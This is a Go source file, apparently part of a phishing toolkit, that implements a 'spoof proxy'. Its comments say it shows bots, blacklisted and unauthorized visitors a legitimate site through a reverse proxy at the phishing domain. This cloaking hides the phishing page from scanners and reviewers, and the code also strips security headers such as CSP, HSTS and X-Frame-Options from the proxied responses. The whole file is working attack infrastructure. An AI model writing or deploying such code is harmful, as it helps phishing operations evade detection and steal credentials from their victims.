package proxy

import (
	"net/http"
	"net/http/httputil"
	"net/url"
)

// SpoofProxy transparently reverse-proxies a configured legitimate website.
// Used when a connection is classified as bot, blacklisted, or unauthorized.
// The visitor sees the spoofed site's content at the phishing domain with no redirect.
type SpoofProxy struct {
	defaultTarget *url.URL
	rp            *httputil.ReverseProxy
}

// NewSpoofProxy constructs a SpoofProxy using defaultSpoofURL as the fallback.
// If defaultSpoofURL is empty, requests are answered with a plain 200 OK.
func NewSpoofProxy(defaultSpoofURL string) *SpoofProxy {
	if defaultSpoofURL == "" {
		return &SpoofProxy{}
	}
	target, err := url.Parse(defaultSpoofURL)
	if err != nil {
		return &SpoofProxy{}
	}
	rp := httputil.NewSingleHostReverseProxy(target)
	rp.ModifyResponse = stripSpoofResponseHeaders
	return &SpoofProxy{defaultTarget: target, rp: rp}
}

// ServeHTTP serves the spoof response using the default configured target.
func (s *SpoofProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if s.rp == nil {
		w.WriteHeader(http.StatusOK)
		return
	}
	s.rp.ServeHTTP(w, r)
}

// ServeWithTarget uses a specific spoof URL rather than the configured default.
func (s *SpoofProxy) ServeWithTarget(w http.ResponseWriter, r *http.Request, spoofURL string) {
	target, err := url.Parse(spoofURL)
	if err != nil {
		s.ServeHTTP(w, r)
		return
	}
	rp := httputil.NewSingleHostReverseProxy(target)
	rp.ModifyResponse = stripSpoofResponseHeaders
	rp.ServeHTTP(w, r)
}

func stripSpoofResponseHeaders(resp *http.Response) error {
	resp.Header.Del("Content-Security-Policy")
	resp.Header.Del("Content-Security-Policy-Report-Only")
	resp.Header.Del("Strict-Transport-Security")
	resp.Header.Del("X-Frame-Options")
	resp.Header.Del("X-Content-Type-Options")
	return nil
}

// Compile-time check: SpoofProxy satisfies Spoofer.
var _ Spoofer = (*SpoofProxy)(nil)
